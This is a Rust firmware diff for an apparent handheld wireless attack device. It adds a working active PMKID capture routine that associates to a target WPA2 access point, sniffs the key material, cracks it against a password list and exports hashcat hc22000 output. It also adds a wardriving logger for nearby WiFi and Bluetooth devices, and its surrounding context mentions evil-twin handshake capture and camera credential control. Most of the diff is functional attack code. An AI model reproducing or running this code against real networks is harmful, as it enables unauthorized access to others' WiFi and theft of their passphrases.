@@ -29,6 +29,7 @@ pub mod netscan;
 pub mod offload;
 pub mod portal;
 pub mod sha256;
+pub mod wardrive;
 pub mod webui;
 pub mod wifi_frames;
 pub mod wpa;
@@ -906,6 +907,122 @@ impl Radio {
         Some(HsOutcome { eapol, captured: true, cracked, hc22000 })
     }
 
+    /// ACTIVE PMKID: instead of waiting for some other client, associate to the target
+    /// OURSELVES (a throwaway password) so the AP emits its EAPOL msg1 — the promiscuous
+    /// sniffer captures it off-air and lifts the RSN PMKID (clientless crack handle). The
+    /// association then fails on the wrong password, but msg1 (with the PMKID) was already
+    /// sent. Raw assoc-request injection is rejected by the IDF blob (like deauth), so the
+    /// trigger has to be a real managed connect. NOTE: promiscuous-RX-during-managed-connect
+    /// is allowed by the API but is the field-untestable unknown — if the assoc won't run
+    /// while promiscuous is on, no msg1 is emitted (falls back to "no PMKID").
+    #[inline(never)]
+    pub fn pmkid_active(
+        &mut self,
+        ssid: &str,
+        bssid: [u8; 6],
+        channel: u8,
+        extra: Option<&[u8]>,
+        mut tick: impl FnMut(u32) -> bool,
+    ) -> Option<HsOutcome> {
+        use esp_radio::wifi::sta::StationConfig;
+        use esp_radio::wifi::{self, Config};
+        EAPOL_COUNT.store(0, Ordering::Relaxed);
+        HS_M1.store(false, Ordering::Relaxed);
+        HS_M2.store(false, Ordering::Relaxed);
+        HS_PMKID.store(false, Ordering::Relaxed);
+        HS_CLIENT_RDY.store(false, Ordering::Relaxed);
+        WANT_REPLAY.store(0, Ordering::Relaxed);
+        // SAFETY: written before promiscuous mode is on, so no cb is running yet.
+        unsafe {
+            *HS.0.get() = HsState::ZERO;
+            (*HS.0.get()).target = bssid;
+        }
+        // bring up a station configured for the target (throwaway pass) + the sniffer.
+        self.deinit_ble();
+        self.deinit_wifi();
+        let w = self.wifi_periph.take().unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
+        let (mut c, ifs) = wifi::new(w, Default::default()).ok()?;
+        let cfg = StationConfig::default().with_ssid(ssid).with_password("echoputer-pmkid".into());
+        if c.set_config(&Config::Station(cfg)).is_err() {
+            // leave the radio in a clean state (don't strand a misconfigured controller
+            // that ensure_wifi would later reuse).
+            self.wifi_ctrl = Some(c);
+            self.wifi_ifaces = Some(ifs);
+            self.deinit_wifi();
+            return None;
+        }
+        self.wifi_ctrl = Some(c);
+        self.wifi_ifaces = Some(ifs);
+        {
+            let i = self.wifi_ifaces.as_mut()?;
+            i.sniffer.set_receive_cb(handshake_cb);
+            if i.sniffer.set_promiscuous_mode(true).is_err() {
+                self.deinit_wifi();
+                return None;
+            }
+        }
+        self.set_channel(channel);
+        esp_println::println!("[PMKID] active solicit ch{}", channel);
+        let mut rounds = 0u32;
+        loop {
+            // a managed connect drives the assoc -> the AP sends msg1 (PMKID), then the
+            // connect fails on the wrong password. The sniffer cb (WiFi task) sees msg1
+            // in parallel while this block_on drives the attempt.
+            if let Some(c) = self.wifi_ctrl.as_mut() {
+                let _ = embassy_futures::block_on(embassy_futures::select::select(
+                    c.connect_async(),
+                    Deadline { start: Instant::now(), dur: Duration::from_secs(3) },
+                ));
+                let _ = embassy_futures::block_on(c.disconnect_async());
+            }
+            rounds += 1;
+            let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
+            if HS_PMKID.load(Ordering::Relaxed) || !tick(eapol) || rounds >= 20 {
+                break;
+            }
+        }
+        if let Some(i) = self.wifi_ifaces.as_mut() {
+            let _ = i.sniffer.set_promiscuous_mode(false);
+        }
+        Delay::new().delay_millis(30); // let any in-flight cb finish before we read
+        let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
+        // SAFETY: promiscuous mode is off now; the cb is quiesced.
+        let snap = unsafe { *HS.0.get() };
+        if !snap.have_pmkid {
+            self.deinit_wifi();
+            return Some(HsOutcome { eapol, captured: false, cracked: None, hc22000: None });
+        }
+        // assemble a PMKID handshake (our own STA is the supplicant) + crack offline.
+        let mut hs = wpa::Handshake::new();
+        let sb = ssid.as_bytes();
+        let sl = sb.len().min(32);
+        hs.ssid[..sl].copy_from_slice(&sb[..sl]);
+        hs.ssid_len = sl;
+        hs.ap_mac = bssid;
+        hs.cli_mac = snap.pmkid_sta;
+        hs.pmkid = Some(snap.pmkid);
+        esp_println::println!("[PMKID] captured (active) in {rounds} rounds");
+        let mut cracked: Option<String> = None;
+        for (idx, pw) in Self::WIFI_PASSWORDS.iter().enumerate() {
+            if !tick(idx as u32) {
+                break;
+            }
+            if wpa::check_passphrase(&hs, pw) {
+                cracked = Some((*pw).into());
+                break;
+            }
+        }
+        if cracked.is_none() {
+            if let Some(bytes) = extra {
+                let base = Self::WIFI_PASSWORDS.len() as u32;
+                cracked = wpa::crack_bytes(&hs, bytes, |i| tick(base + i));
+            }
+        }
+        let hc22000 = Some(wpa::to_hc22000(&hs));
+        self.deinit_wifi();
+        Some(HsOutcome { eapol, captured: true, cracked, hc22000 })
+    }
+
     /// EVIL-TWIN half-handshake capture: stand up a WPA2-PSK softAP advertising
     /// `ssid` on `channel` (our own throwaway password) and sniff the connecting
     /// client's EAPOL msg2 alongside it — the client's MIC is derived from the REAL
@@ -1170,6 +1287,62 @@ impl Radio {
         camscan::control(sta, mac, ip, port, brand, basic, digest, user, pass, vm, input);
         self.deinit_wifi();
         Ok(())
+    }
+
+    // ------------------------------ wardriving ------------------------------
+
+    /// Repeatedly scan WiFi (+ BLE every 3rd round) and append each newly-seen device
+    /// to the SD `WARDRIVE.CSV` log until `tick` returns false. WiFi is torn down on
+    /// exit. No GPS, so this is a signal/inventory log, not a geo track.
+    #[inline(never)]
+    pub fn run_wardrive<D: embedded_sdmmc::BlockDevice, T: embedded_sdmmc::TimeSource>(
+        &mut self,
+        vm: &embedded_sdmmc::VolumeManager<D, T>,
+        mut tick: impl FnMut(&wardrive::WardriveState) -> bool,
+    ) -> wardrive::WardriveState {
+        let mut st = wardrive::WardriveState::new();
+        st.got_file = wardrive::init(vm);
+        let mut seen: Vec<[u8; 6]> = Vec::new();
+        let mut seen_ble: Vec<[u8; 6]> = Vec::new();
+        loop {
+            if !tick(&st) {
+                break;
+            }
+            // no writable SD: don't spin the radio or inflate a count for rows that
+            // were never persisted — just let the UI show "no SD" until the user exits.
+            if !st.got_file {
+                Delay::new().delay_millis(100);
+                continue;
+            }
+            if let Some(aps) = self.scan() {
+                let mut chunk = String::new();
+                for ap in &aps {
+                    if seen.len() < 2048 && !seen.iter().any(|b| b == &ap.bssid) {
+                        seen.push(ap.bssid);
+                        chunk.push_str(&wardrive::ap_row(ap));
+                        st.aps += 1;
+                    }
+                }
+                wardrive::append(vm, &chunk);
+            }
+            // BLE every 3rd round — halve the WiFi/BLE coexistence re-init churn.
+            if st.rounds % 3 == 2 {
+                if let Some(bles) = self.ble_scan() {
+                    let mut chunk = String::new();
+                    for b in &bles {
+                        if seen_ble.len() < 2048 && !seen_ble.iter().any(|a| a == &b.addr) {
+                            seen_ble.push(b.addr);
+                            chunk.push_str(&wardrive::ble_row(b));
+                            st.ble += 1;
+                        }
+                    }
+                    wardrive::append(vm, &chunk);
+                }
+            }
+            st.rounds = st.rounds.wrapping_add(1);
+        }
+        self.deinit_wifi();
+        st
     }
 
     // ----------------------------- crack offload ----------------------------
